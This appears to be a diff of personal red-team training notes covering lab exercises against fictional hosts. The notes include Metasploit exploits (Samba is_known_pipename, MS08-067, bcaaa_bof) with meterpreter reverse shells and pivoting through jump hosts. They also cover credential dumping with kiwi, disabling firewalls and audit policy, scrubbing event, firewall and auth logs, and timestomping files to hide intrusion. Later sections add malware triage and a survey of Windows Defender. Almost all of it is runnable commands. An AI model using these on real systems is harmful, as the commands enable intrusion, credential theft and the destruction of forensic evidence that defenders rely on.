+run multicommand -cl 'cmd /c findstr  /c:"192.168.106.20" %systemroot%\system32\LogFiles\Firewall\pfirewall.log'
+
+#8.6 verify time and file size 
+ls  %systemroot%/system32/LogFiles/Firewall/pfirewall.log
+
+#9. reenable firewall - before disconnect 
+run multicommand -cl 'netsh advfirewall set currentprofile state on'
+
+
+
+}
+
+
+# reenable audit rules  
+--- generates LOTS of security logs 
+
+# so clear w/ kiwi 
+kiwi_cmd event::clear
+
+# clean prefetch 
+
+}
+
+}
+
+
+#T2 { 
+
+# meterpreter {
+
+# exploit {
+use exploit/linux/samba/is_known_pipename 
+show info 
+	# since we know tgt is x64 
+set target 3 # Linux x86_64 
+set payload linux/x64/meterpreter/reverse_tcp
+set RHOSTS 127.0.0.1 
+set RPORT 4446
+set LHOST 192.168.106.51 # T1 
+set LPORT 8260
+
+set SMB::AlwaysEncrypt false
+set SMB::ProtocolVersion 1
+}
+
+# SA  
+localtime
+getpid
+getuid 
+sysinfo 
+netstat 
+
+# switch to SSH 
+cat /etc/ssh/sshd_config # which users can ssh? what port config to?
+	Allowed: Armorer, shand 
+	port 2222 
+	
+# check iptables 
+execute -f /sbin/iptables -a -nL -i
+	logs SSH to port 2222
+	no blocking 
+
+cd /root # enum Maildir file = creds 
+shand / Tatooine 
+
+cd /home # enum users 
+ls /home/shand 
+cat /etc/sudoers # check sudoers 
+	cat /etc/group 
+	# shand is a sudoer
+
+bg
+
+}
+ 
+# on T1 to T2 ssh port 
+portfwd add -L 127.0.0.1 -l 2223 -r 192.168.106.10 -p 2222
+
+# SSH {
+# CONN 
+ssh -x -v -p2223 shand@127.0.0.1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+Tatooine
+
+sudo bash
+
+# survey {
+
+find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin - -type f -print0 | xargs -0 ls -latr 
+egrep -r "192.168.106.51|1337" /var/log 
+
+/var/log/syslog 
+/var/log/kern.log 
+/var/log/auth.log 
+
+# when does auth.log rotate? (or other common system logs?)
+cat /etc/logrotate.d/rsyslog
+
+
+
+} 
+
+# clean auth.log.1 {
+egrep "Dec  2 13:44:33|Dec  2 13:44:43" /var/log/auth.log.1
+zclean
+
+touch -r /var/log/syslog.1 /var/log/auth.log.1
+
+}
+
+# other cleans {
+egrep -r "192.168.106.51" /var/log 
+
+egrep "Jul 24 22:40:35" /var/log/auth.log
+touch -t 202307241630.01 /var/log/auth.log
+
+#egrep "192.168.106.51" /var/log/kern.log  -- killed an OLD valid log!
+egrep "DPT=445|22:40:28" /var/log/kern.log 
+	^ gets the 8 exploti logs and 1 SSH log (avoiding the prior SSH valid log)  
+	
+touch -t 202306242240.28 /var/log/kern.log 
+
+egrep "192.168.106.51|22:40:35" /var/log/syslog
+	# cleans firewall logs and systemd slice/target entries
+touch -t 202306242340.01 /var/log/syslog
+
+
+}
+
+``` T2 residue/ cleanup ``` {
+
+find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -64 -type f -print0 | xargs -0 ls -latr 
+
+# remote login artifacts 
+rm -rf /home/shand/.lesshst 
+rm -rf /home/shand/.sudo_as_admin_successful
+
+# revert directory time - recorded BEFORE user ssh login, via meterpreter 
+touch -t 202206201034.32 /home/shand
+
+# samba artifacts 
+rm -rf /run/sudo/ts/shand
+rm -rf /var/cache/samba/browse.dat 
+
+
+ls -al /tmp 
+	nothin 
+}
+
+}
+
+
+
+}
+
+#T3 { 
+
+# 23. recon (on T1)  {
+load extapi
+adsi_dc_enum BOOT 
+resolve Arctic.boot.lab
+	192.168.106.13
+
+# impersonate
+ps 
+steal_token <x64 proc owned by mr.robot>
+# not enough perms token example (how to get back) { 
+
+steal_token 3024 (skypehost.exe)
+	# IGNORE the access is denied msg 
+shell 
+whoami  - mr. robot 
+wmic /node:arctic.boot.lab os get osarchitecture
+	access denied 
+	whoami /priv
+shell
+	whoami /priv = still no more perms/ failed
+
+# return 
+exit 
+rev2self 
+getuid 
+	
+}
+
+# succ DNS arch enum 
+steal_token 3856 (rdpclip.exe)
+shell 
+wmic /node:arctic.boot.lab os get osarchitecture
+	64-bit 
+
+# enum users 
+EXIT
+rev2self
+adsi_user_enum BOOT
+run multicommand -cl 'net group "Domain Admins" /domain'
+	# domain admins = found. creds?
+run multicommand -cl 'net group "Enterprise Admins" /domain'
+
+}
+
+# 24. steal creds 
+creds_all
+	mr.robot 
+	0nes-and-Zer0s
+
+# open FW rule and create portfwd for exploit (similar to reaching T2)
+portfwd add -L 127.0.0.1 -l 4446 -r 192.168.106.13 -p 445
+portfwd add -R -L 127.0.0.1 -l 56875 -p 56875
+
+run multicommand -cl 'netsh advfirewall firewall add rule name="gerogero" dir=in action=allow protocol=TCP remoteip=192.168.106.13'
+
+
+# exploit {
+set RHOSTS 127.0.0.1 
+set RPORT 4446
+set payload windows/x64/meterpreter/reverse_tcp
+set LPORT 56875
+set LHOST 192.168.106.51
+set SMBUser mr.robot 
+set SMBPass 0nes-and-Zer0s
+
+}
+
+# check auditpol rules - & temp clear IF NOISY (System Integrity & Other System Event ) {
+
+# create backup
+run multicommand -cl 'auditpol /backup /file:c:\windows\temp\MpSvcStub2.log'
+
+# clear audit rules 
+run multicommand -cl 'auditpol /clear /y'
+
+# verify rules cleared 
+run multicommand -cl 'auditpol /get /category:*'
+
+# download backup of Rules
+download c:/windows/temp/MpSvcStub2.log /tmp
+
+# delete copy off target
+del c:/windows/temp/MpSvcStub2.log
+
+# upload & reenable 
+upload /tmp/MpSvcStub2.log
+run multicommand -cl 'auditpol /restore /file:MpSvcStub2.log'
+run multicommand -cl 'auditpol /get /category:*' 
+rm MpSvcStub2.log
+}
+
+# survey {
+run multicommand -cl 'cmd /c netstat -ano | findstr /v "PID of dns.exe"'
+	run multicommand -cl 'cmd /c netstat -ano | findstr /v "1392"'
+
+C:\Progfilex64\Winpcap\rpcapd.exe 
+rpacpd.exe service running 
+
+
+}
+
+
+# ACTIVE DIRECTORY post-exploit enumeration {
+
+# view all groups within domain 
+run post/windows/gather/enum_ad_groups
+	#  NOTE: Built-In groups are local to computer, not domain. IOT query, use - 
+	run multicommand -cl 'net localgroup <GROUP>' 
+
+# list domain computers/users 
+run post/windows/gather/enum_domain_group_users GROUP="Domain Users"
+run post/windows/gather/enum_domain_group_users GROUP="Domain Computers" 
+	
+# list Remote Desktop users
+run multicommand -cl 'net localgroup "Remote Desktop Users"' 
+
+--------- enumerate DNS records ---------
+# list of Zones in server 
+run multicommand -cl 'dnscmd /enumzones'
+# enum forward/reverse zone records - SYNTAX 
+run multicommand -cl 'dnscmd /enumrecords forward.zone.name @'
+
+# records for Domains primary Forward and Reverse zones 
+run multicommand -cl 'dnscmd /enumrecords _msdcs.boot.lab @'
+run multicommand -cl 'dnscmd /enumrecords boot.lab @'
+
+run multicommand -cl 'dnscmd /enumrecords 106.168.192.in-addr.arpa @'
+run multicommand -cl 'dnscmd /enumrecords 97.0.10.in-addr.arpa @'
+
+
+}
+
+# Pillage hashes {
+
+run post/windows/gather/smart_hashdump
+load kiwi 
+kiwi_cmd sekurlsa::logonpasswords
+	Administrator 
+	P@leH0rse
+}
+
+# clean event logs {
+
+# where are we logging?
+run event_manager -i
+	- PROBABLY: SYSTEM,SECURITY,APPLICATION,Windows Powershell,DNS Server
+
+# multidump
+run multicommand -cl 'cmd /c wsupdt.exe -m 180 SYSTEM /accepteula' -f /tmp/SYSTEM.log 
+run multicommand -cl 'cmd /c wsupdt.exe -m 180 SECURITY'  -f /tmp/SECURITY.log 
+run multicommand -cl 'cmd /c wsupdt.exe -m 180 APPLICATION'  -f /tmp/APPLICATION.log 
+run multicommand -cl 'cmd /c wsupdt.exe -m 180 "Windows Powershell"'  -f /tmp/Powershell.log 
+run multicommand -cl 'cmd /c wsupdt.exe -m 180 "DNS Server"'  -f /tmp/DNS.log 
+
+# psexec exploit ID search 
+7009 7045  - SYSTEM 
+4776 4672 4624 - SECURITY 
+
+# kiwi clean 
+kiwi_cmd "privilege::debug"
+kiwi_cmd "event::drop"
+kiwi_cmd "event::clear" 
+	(this will clear the SECURITY log, and is the default setting)
+kiwi_cmd "event::clear /log:System" 
+	(this will clear the SYSTEM log)
+run event_manager -i
+
+}
+
+# firewall cleaning practice { 
+--------- 
+ communications from 192.168.106.23 to 192.168.106.13 port TCP/445 and from 192.168.106.13 to 192.168.106.23 port TCP/3389 that need to be remove
+---------
+
+ls c:/windows/system32/logfiles/firewall/pfirewall.log # default loc AFTER xp
+	2022-06-15 13:57:51
+cd c:/windows/system32/logfiles/firewall
+
+#2. search for IP, find discrete string 
+run multicommand -cl 'cmd /c findstr /c:"2022-06-15 13:25:01" pfirewall.log' + 13:25:02 
+	# !!! IP is sometimes too broad for /v removal (there are older entries with your IP) == search/clean with timestamp
+	run multicommand -cl 'cmd /c findstr /c:"2022-06-15 13:25:01" pfirewall.log'
+	run multicommand -cl 'cmd /c findstr /c:"2022-06-15 13:25:02" pfirewall.log'
+	
+#3. write clean copy to c:/windows/temp - (findstr /v > newfile)
+run multicommand -cl 'cmd /c findstr /v /c:"2022-06-15 13:25:01" pfirewall.log > c:/windows/temp/sd102.tmp'
+run multicommand -cl 'cmd /c findstr /v /c:"2022-06-15 13:25:02" c:/windows/temp/sd102.tmp > c:/windows/temp/sd103.tmp'
+
+
+#2.5 
+run multicommand -cl 'cmd /c findstr /c:"2022-06-15 13:25:07" pfirewall.log '
+
+#3.5 
+run multicommand -cl 'cmd /c findstr /v /c:"2022-06-15 13:25:07" c:\windows\temp\sd103.tmp > c:/windows/temp/sd104.tmp'
+
+#4. confirm string remove 
+cd c:/windows/temp
+run multicommand -cl 'cmd /c findstr /c:"192.168.106.20" c:/windows/temp/sd102.tmp'
+
+#5. Disable firewall - IOT overwrite pfirewall.log 
+	- disable firewall (causes baloon on user desktop & even entries) 
+	- so check if SCREENSAVER is running & user idletime 
+ps # check for logon.scr // *.scr 
+idletime 
+run multicommand -cl 'netsh advfirewall set currentprofile state off' # disable firewall, otherwise generate LARGE GAPS in log
+
+
+#7. overwrite original log file 
+run multicommand -cl 'cmd /c move sd104.tmp c:/windows/system32/logfiles/firewall/pfirewall.log'
+
+#8. timestomp - using original filetime 2022-06-15 13:57:51
+timestomp -m "06/15/2022 13:57:51" c:/windows/system32/logfiles/firewall/pfirewall.log
+
+#8.5 confirm clean
+run multicommand -cl 'cmd /c findstr  /c:"192.168.106.20" %systemroot%\system32\LogFiles\Firewall\pfirewall.log'
+
+#8.6 verify time and file size 
+ls  %systemroot%/system32/LogFiles/Firewall/pfirewall.log
+
+#9. reenable firewall - before disconnect 
+run multicommand -cl 'netsh advfirewall set currentprofile state on'
+
+
+}
+
+# find today's modified
+run multicommand -cl 'cmd /c dir c:\*.log /S /A | findstr "07/25/2023"'
+run multicommand -cl 'cmd /c dir c:\*.wer /S /A | findstr "07/25/2023"'
+
+```T3  cleanup ``` {
+
+# on T1
+portfwd del -L 127.0.0.1 -l 4446 -r 192.168.106.13 -p 445
+portfwd del -R -L 127.0.0.1 -l 56875 -p 56875
+
+run multicommand -cl 'netsh advfirewall firewall del rule name="gerogero"'
+
+run multicommand -cl 'cmd /c dir c:\*.log /S /A | findstr "07/25/2023"'
+run multicommand -cl 'cmd /c dir c:\*.wer /S /A | findstr "07/25/2023"'
+run multicommand -cl 'cmd /c dir c:\*.dmp /S /A | findstr "07/25/2023"'
+
+
+# on T3 
+
+*restore auditpol 
+
+# reenable firewall 
+run multicommand -cl 'netsh advfirewall set currentprofile state on'
+
+
+# upload & reenable 
+upload /tmp/MpSvcStub2.log
+run multicommand -cl 'auditpol /restore /file:MpSvcStub2.log'
+run multicommand -cl 'auditpol /get /category:*' 
+rm MpSvcStub2.log
+
+
+del c:/windows/temp/wsupdt.exe
+
+# reenable firewall 
+run multicommand -cl 'netsh advfirewall set currentprofile state on'
+
+
+
+}
+
+
+}
+
+}
+
+
+}
+
+}
+
+{ ``` 3. Live Tactical Forensics ``` 
+
+``` 3.1 Malware, Botnets, and Rootkits ``` {
+
+# Sus proc (malware) prosecute notes  {
+1. google-fu (research)
+2. sandbox
+3. download & inspect malware # note timestamp, strings it, etc. 
+4. find dlls 
+	tasklist /m  # if sus name or timestamp, download & review 
+5. view file handles (handle table) # look for network-aware handles, like \device\tcp
+	handle -p proc.exe # process ID/ PID proc name 
+	handle -a # ALL handles, all procs 
+6. registry keys 
+	reg enumkey -k "HKLM/Software/Microsoft/Windows/CurrentVersion/Run"
+	reg query /s -v
+		-s = all keys/subkeys 
+		-v = specific registry key value 
+7. network use 
+	run uploadexec -e /usr/share/windows-resources/binaries/fport/Fport.exe -r -v 
+		show which procs control which ports. any sus procs control a socket? they may later...
+8. review timestamps 
+	dir /infected/dir 
+		- filesize match sus? 
+		- dir c:\* /S /T:W | find "MM/DD/YYYY HH:MM" ``` !!!! ```
+		- search -f <file> # find location
+9. signed binaries 
+	sigcheck - signed by the developer/microsoft. file date /product name/version/description/publisher 
+		- PROBABLY not going to use this... bc interacts w/microsoft 
+		- sigcheck c:\windows\system32\spoolmgr.exe
+		# show only unsigned files in directory, redirect to file so output doesnt kill connection 
+		sigcheck -u c:\windows\system32\drivers >sigcheck.txt  ``` !!!!  ```
+	Most malware IS NOT signed. Some are (anyone can purchase a certificate). Some legit file aren't signed... 
+10. verify file hashes 
+	MD5hash -> virustotal 
+	# online sandbox response 
+	whois -h hash.cymru.com <HASH>
+		response= hash [last time malware seen (epoch time)] [NUM malicious hits on AV products]
+11. sniffers: check for promisc mode 
+	# telltale sign network sniffer is running. DISCLUDE VPN interfaces 
+	run uploadexec -e /root/promicdetect.exe -r -v 
+12. hex editor
+	# does it have a backdoor?  is it network-aware? func calls like wininit.dll funcs (ftpgetfile,httpgetrequest)
+13. memory dump 
+	# plenty of malware using process/DLL inject to hijack & run legitimately 
+	- meterpreter 
+	# ask 
+		- are there established connections?
+		- strange values/entries in reg keys
+		- wierd file names? svch0st.exe yyu534df.exe?
+	# dump process, analyze strings 
+	How to narrow down? 
+	ps # narrow down to NETWORK\SERVICE  (not local) 
+		run process_memdump -h 
+		run process_dump -p 1008 
+		strings 192.168.27.118_svhost.exe_1008_20121012.4928.dmp | grep metsrv 
+}
+
+# Exercise 1. Malware Discovery and Triage 1 {
+
+Ops Box: 1337h4x.ops.local
+> Jump 1: ccc.raccoon.lab (EXT IP: 203.0.113.5), access via SSH port 22, Creds: jcook / Br0k3nRecord
+>> Jump 2: web.drytortugas.lab (EXT IP: 192.0.2.80, INT IP: 172.17.10.80), access via SSH port 22, Creds: www / Webific@ti0n
+>>> Target 1: testbed1.drytortugas.lab (IP: 172.17.20.75), Windows XP, access via MS08-067 exploit
+
+
+#J1 {
+ssh -x -v -p22 jcook@203.0.113.5 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L2222:192.0.2.80:22
+Br0k3nRecord
+
+}
+
+#J2 { 
+ssh -x -v -p2222 www@localhost -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L44445:172.17.20.75:445 -R1337:127.0.0.1:1337
+Webific@ti0n
+
+}
+
+# T1 {
+
+# exploit {
+use exploit/windows/smb/ms08_067_netapiset 
+set PAYLOAD windows/meterpreter/reverse_tcp
+set RHOST 127.0.0.1
+set RPORT 44445
+set LHOST 172.17.10.80
+set LPORT 1337
+#set ReverseListenerBindAddress 0.0.0.0
+
+#LOGS 
+SECURITY - 529
+SECURITY - 680
+
+}
+
+# survey {
+
+# ps 
+logon.scr = sus? 
+"c:\program files\xfin_portal\CIDGlobalLight.exe"
+c:\windows\system32\wscntfy.exe 
+c:\WINDOWS\system23\MSLARISSA.pif 
+
+#netstat
+jqs.exe PID1948, port 5152 
+alg.exe pid 1528, port 1029 
+spotifywebhelper.exe pid1732, port4370/4380
+
+# HKLM\software\microsoft\windows\currentversion\run 
+MSLARISSA 
+Command Prompt32 
+(L4r1$$4) (4nt1) (V1ruz)
+
+}
+
+# check for exploit logs 
+run event_manager -l security -f 529
+run event_manager -l security -f 680
+	yup, 1 in each 
+	
+# prosecute {
+dir 'C:\WINDOWS\system32\MSLARISSA.pif'
+download 'C:\WINDOWS\system32\MSLARISSA.pif' /tmp
+	download 'C:\WINDOWS\WinVBS.vbs' /tmp
+download 'C:\WINDOWS\SP00Lsv32.pif' /tmp 
+
+run multicommand -cl 'cmd /c dir c:\ /S /A | findstr "2009-11-10"'
+
+files added same day 
+download 'C:\WINDOWS\system32\CmdPrompt32.pif' /tmp
+download 'C:\WINDOWS\system32\SpoolMgr.exe' /tmp
+
+# hash check 
+for i in ($ls -latf *.pif); do md5sum $i; done 
+
+# strings WinVBS.vbs, search for and download script 
+search -f *Wscript.*
+download 'c:\WINDOWS\system32\wscript.exe' /tmp
+
+}
+
+
+``` EXITS ``` {
+
+- remove psloggedlist
+- remove sysinternal key 
+# on exit 
+reg deletekey -k "HKU\.Default\Software\Sysinternals"
+del c:/windows/temp/wsupdt.exe
+
+
+# feedback exits 
+
+# check directory for created files, delete 
+dir c:\Documents and Settings\All Users\Application
+- if  Dr. Watson directory, del anything create
+
+c:\windows\temp  # residue? 
+
+c:\windows\prefetch 
+
+}
+
+}
+
+
+
+}
+
+# Exercise 2. Malware Discovery and Triage 2 {
+Ops Box: 1337h4x.ops.local
+> Jump 1: ras.fatdeer.lab (EXT IP: 198.18.30.5), access via SSH port 22, Creds: remoteuser / remote
+>> Jump 2: linux.ramrod.lab (EXT IP: 100.64.36.17, INT IP: 192.168.1.102), access via SSH port 2222, Creds: root / P@$$w0Rd123
+>>> Target 1: kuzy2.ramrod.lab (IP: 192.168.1.18), Windows 7, access via bcaaa_bof exploit
+
+# J1 {
+
+``` 1. Connection/ Exploit ``` {
+ssh -x -v -p22 remoteuser@198.18.30.5 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L2222:100.64.36.17:2222
+remote
+
+}
+
+``` 2. Survey ``` {
+
+}
+
+``` 3. Actions ``` {
+
+}
+
+``` 4. LOGS/ EXITS ``` {
+
+}
+
+
+}
+
+# J2 {
+
+``` 1. Connection/ Exploit ``` {
+ssh -x -v -p2222 root@localhost -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L16102:192.168.1.18:16102 -R4444:127.0.0.1:4444
+P@$$w0Rd123
+
+}
+
+``` 2. Survey ``` {
+
+}
+
+``` 3. Actions ``` {
+
+}
+
+``` 4. LOGS/ EXITS ``` {
+
+}
+
+
+
+
+}
+
+# T1 {
+
+``` 1. Connection/ Exploit ``` {
+use windows/misc/bcaaa_bof 
+set payload windows/meterpreter/reverse_tcp
+set RHOSTS 127.0.0.1 
+set RPORT 16102 (default)
+set LHOST 192.168.1.102 # internal IP 
+set LPORT 4444 (default)
+show options 
+
+
+# LOGS - APPLICATION 
+1001 - INFO 
+1003 - INFO
+2207 - ERROR 
+
+
+
+
+}
+
+``` 2. Survey ``` {
+
+1748 - iexplore.exe, PPID - 1560
+"C:\Program Files (x86)\Internet Explorer\iexplore.exe" 
+	- established conn to port (192.168.1.18:49161 -> 67.214.175.69:82)" 
+1969 PPID 1560, svchost.exe - "C:\Windows\SysWOW64\svchost.exe"
+
+run multicommand -cl 'cmd /c dir /tc "C:\Program Files (x86)\Internet Explorer\iexplore.exe"  '
+run multicommand -cl 'cmd /c dir /tc c:\* /A /S | find "08/31/2009  08:45"'
+
+C:\Windows\InstallDir\server.exe 
+
+# prosecute {
+
+For any abnormal / strange processes, network connections or files:
+
+#1. review any relevant analysis from antivirus vendors / security researcher
+GOOGLE-FU
+
+#1.5 file time and find associated files 
+dir /infected/dir 
+		- filesize match sus?
+timestomp -v 'c:\suspath\'		
+	dir /tc malicious.exe
+run multicommand -cl 'cmd /c dir /tc c:\* /A /S | find "MM/DD/YYYYspspHH:MM"' # search similar sus writes times 
+		- search -f <file> # find location
+
+#2. Download a copy of the file in question and any related files. (look for other files with similar file times or files that are noted in any analysis)
+download "C:\Program Files (x86)\Internet Explorer\iexplore.exe"
+download "C:\Windows\SysWOW64\svchost.exe"
+
+#3. Proc info
+ps 
+	*****
+
+#4. DLL’s
+run multicommand -cl 'tasklist /m' # ALL DLLs 
+	run multicommand -cl 'tasklist /FI "PID eq <PID>" /M
+	
+#5. open handles 
+upload handle.exe <blended>
+#run uploadexec -e handle.exe -p 1684 -a ////// WIP 
+run multicommand -cl 'handle.exe -p 1684 -a'  # process ID/ PID/ proc name 
+	handle -a # ALL handles
+del c:/windows/temp/handle.exe 
+
+handle.exe 
+= shows correlation to ((Mutex))  
+
+# REG KEYS {
+==================================== START ====================================
+#1. Run keys 
+reg enumkey -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' 
+reg enumkey -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+reg enumkey -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx' 
+
+reg enumkey -k 'HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
+reg enumkey -k 'HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
+
+#2. Explorer\Run 
+reg enumkey -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run'
+reg enumkey -k 'HKLM\Software\Wow6432Node\Windows\CurrentVersion\Policies\Explorer\Run'
+
+#3. Winlogon\Shell
+reg queryval -k 'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' -v Shell 
+reg queryval -k 'HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon' -v Shell 
+
+#4. Explorer\(User Shell Folders|ShellFolders)
+reg enumkey -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders'
+reg enumkey -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders'  
+
+reg enumkey -k 'HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders'
+reg enumkey -k 'HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders'
+
+#5. AppInit_DLLs
+reg queryval -k 'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\' -v AppInit_DLLs
+reg queryval -k 'HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows\' -v AppInit_DLLs
+
+==================================== USER ====================================
+
+# user reg query 
+run multicommand -cl 'reg enumkey -k "HKU\\S-1-5-21-541785654-617286911-1284036929-1004\\software\\microsoft\\windows\\currentversion\\run"'
+
+--- C:\Windows\InstallDir\server.exe 
+	- from SYSTEM ran - reg queryval -k HKU\\<USER-SID>\software\microsoft\windows\currentversion\run
+run multicommand -cl 'cmd /c dir /tc c:\ /A /S | find "03/30/2019  13:41"'
+	
+steal_token <user-PID> 
+
+#1. Run Keys 
+reg enumkey -k 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' 
+reg enumkey -k 'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce' 
+reg enumkey -k 'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceEx' 
+
+#2. Shell Folders 
+reg enumkey -k 'HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders'
+reg enumkey -k 'HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders'
+
+
+drop_token 
+getuid 
+
+==================================== END ====================================
+
+
+
+# LOGS 
+run multicommand -cl 'wevtutil qe APPLICATION "/q:*[System [(EventID=1001)]]" /rd:true /f:text' 
+run multicommand -cl 'wevtutil qe APPLICATION "/q:*[System [(EventID=1003)]]" /rd:true /f:text' 
+run multicommand -cl 'wevtutil qe APPLICATION "/q:*[System [(EventID=2207)]]" /rd:true /f:text' 
+
+
+
+}
+}
+
+google of installdir\server.exe 
+https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_vb.smut5
+--- LESSON LEARNED: USE GOOGLE 
+- from site above, also located 
+
+HKEY_CURRENT_USER\SOFTWARE\--((Mutex))--
+KEY_CURRENT_USER\Software\--((Mutex))--
+ServerName = "%Windows%\InstallDir\Server.exe"
+
+C:\Users\enver\AppData\Local\Temp - server.exe
+
+
+# unpack and view server.exe 
+upx -d server.exe -o server.exe.uncomp 
+hexeditor server.exe.uncomp
+
+
+}
+
+``` 3. Actions ``` {
+~+C
+-R1337:127.0.0.1:1337
+
+# RESERVE SESSION SO CAN MIGRATE TO USER SESSION !!! 
+run post/windows/manage/multi_meterpreter_inject PAYLOAD=windows/x64/meterpreter/reverse_tcp IPLIST=192.168.1.102 LPORT=1337 SESSION=1 HANDLER=true # RPF 
+
+
+
+}
+
+``` 4. LOGS/ EXITS ``` {
+
+}
+
+
+
+
+}
+
+run multicommand -cl 'cmd /c dir c:\*.log /S /A | findstr "07/27/2023"'
+
+
+}
+
+}
+
+``` 3.2 Security Products ``` {
+
+# Exercise 2. Windows 10 Security Survey and Triage {
+Ops Box: 1337h4x.ops.local
+> Jump 1: ras.fatdeer.lab (EXT IP: 198.18.30.5), access via SSH port 22, Creds: remoteuser / remote
+>> Jump 2: web.drytortugas.lab (EXT IP: 192.0.2.80, INT IP: 172.17.10.80), access via SSH port 22, Creds: www / Webific@ti0n
+>>> Target 1: simonton.boot.lab, (IP: 192.168.200.12), Windows 10, access via pre-implanted windows/meterpreter_bind_tcp backdoor listening on TCP/17501
+
+
+# J1
+ssh -x -v -p22 remoteuser@198.18.30.5 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L2222:192.0.2.80:22
+remote
+
+# J2 
+ssh -x -v -p2222 www@localhost -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L17501:192.168.200.12:17501 -R1337:127.0.0.1:1337
+Webific@ti0n
+
+# T1 {
+
+``` 1. Connection/ Exploit ``` {
+
+# exploit/multi/handler {
+use exploit/multi/handler 
+set payload windows/meterpreter_bind_tcp 
+set LPORT 17501
+set RHOST 127.0.0.1 
+
+run
+
+} 
+
+}
+
+``` 2. Survey ``` {
+
+}
+
+``` 3. Actions ``` {
+# upgrade 
+run post/windows/manage/archmigrate SESSION=1 IGNORE_SYSTEM=true
+
+# 8. --- this wouldnt have worked if was still in 32bit session
+run multicommand -cl 'nbtstat -n'
+
+#10. 
+adsi_dc_enum BOOT
+
+#11. duplicat sessions for USER enum on ESP
+run post/windows/manage/multi_meterpreter_inject PAYLOAD=windows/x64/meterpreter/reverse_tcp IPLIST=172.17.10.80 LPORT=1337 SESSION=1 HANDLER=true
+
+ps -U aldersone
+migrate 2924 (sihost.exe )
+
+"C:\Program Files\Windows Defender\MpCmdRun.exe"
+"C:\Program Files\Windows Defender\MSASCuiL.exe" 4212
+"C:\Program Files\Windows Defender\MsMpEng.exe" 1976
+
+#12 - WIN ESP triage + QUESTIONS {
+
+# Determine the Product Name
+"C:\Program Files\Windows Defender\MpCmdRun.exe"
+"C:\Program Files\Windows Defender\MSASCuiL.exe" 
+"C:\Program Files\Windows Defender\MsMpEng.exe"
+Windows Defender 
+
+# Determine the Specific version of the product/software
+
+# Determine the date the latest signature were installed
+
+# Determine the security capabilities of the installed product (real time scan, scheduled scans, spyware/adware detection, email scan, heuristic detection, signature detection, cloud or sand boxing, memory scans etc.) 
+
+# You may be able to run handle.exe or handle64.exe (depending) against the ESP related processes to gather info such as the location of logs that are being written to.
+
+# Determine when the last scan occurred and the next scan will occur
+
+# Determine if the product logs locally, remotely or both
+
+# Determine if the product has the ability to ship off detected malware remotely and if that capability is enabled
+
+# Determine the location of any quarantine location on the local host
+
+# Determine if your activities have been detected by the ESP
+
+
+/////////////////////////////////////////////////// QUESTIONS 
+# find related files via regkey or file handles 
+reg enumkey -k 'HKLM\software\microsoft\Windows Defender'
+	or 
+upload handle64.exe 
+handle64.exe -p<defender> /accepteula 
+	# note opended files 
+
+#14. What are the current versions of the Product, Engine and AV Signatures?
+MpSigStub and MPLog files 
+reg enumkey -k "HKLM\Software\Microsoft\Windows Defender\Signature Updates"
+reg queryval -k "HKLM\Software\Microsoft\Windows Defender\Signature Updates" -v EngineVersion 
+reg queryval -k "HKLM\Software\Microsoft\Windows Defender\Signature Updates" -v AVSignatureVersion
+reg queryval -k "HKLM\Software\Microsoft\Windows Defender\Signature Updates" -v NISEngineVersion ?
+
+search -f *MpSigStub*
+download 'C:\Windows\Temp\MpSigStub.log' /tmp
+search -f *MpLog*
+download 'c:\programdata\microsoft\windows defender\support\MPLog-12122017-155219.log' /tmp
+dos2unix 
+
+# So can get all 3 infos from MpSigStub.log 
+vim MpSigStub.log 
+	- go to bottom
+	- AV delta VDM (updated to) = AV version
+	- Engine 
+	- Platform = product version
+
+#15. What is the date and time of the latest signatures that were installed?
+check end of MpSigStub.log 
+
+#16. Which "log" files are being written to by this ESP?
+run multicommand -cl 'cmd /c dir c:\*.log /S /A /od /tw' -f /tmp/T<>logsearch
+	find "Defender"
+- History.Log
+- MPDetection***.log 
+- MPLog-****.log
+
+
+# 17. When was the last successful scheduled scan before today performed?
+reg queryval -k 'HKLM\software\microsoft\windows defender\scan' -v LastScanRun
+w32tm /ntte 0x6ad16f26cfc1d901
+- 13/41/25991 11:51:03 (NTTE) ?
+- 12/26/1900 8:29:03 (NTPTE) ? 
+
+#18. When is the next scheduled scan?
+run multicommand -cl 'schtasks /query'.
+7/29/23 10:59:38	
+
+#19. Can this product send files back to its "mothership" and if so, is this capability enabled or not? 
+reg queryval -k 'HKLM\software\microsoft\windows defender\spynet' -v spynetreporting # MUST BE SYSTEM
+	0
+
+#20. Where is the quarantine folder located on the remote host, and if there are any files in there, are they related to your activities?
+dir 'C:\ProgramData\Microsoft\Windows Defender\Quarantine\Entries'
+}
+
+#21 - WinRM/WEC - remote collection check {
+
+#Windows remote log services:
+- Windows Event Collector (WEC)
+- Windows Remote management (WinRM)
+run post/windows/gather/enum_services
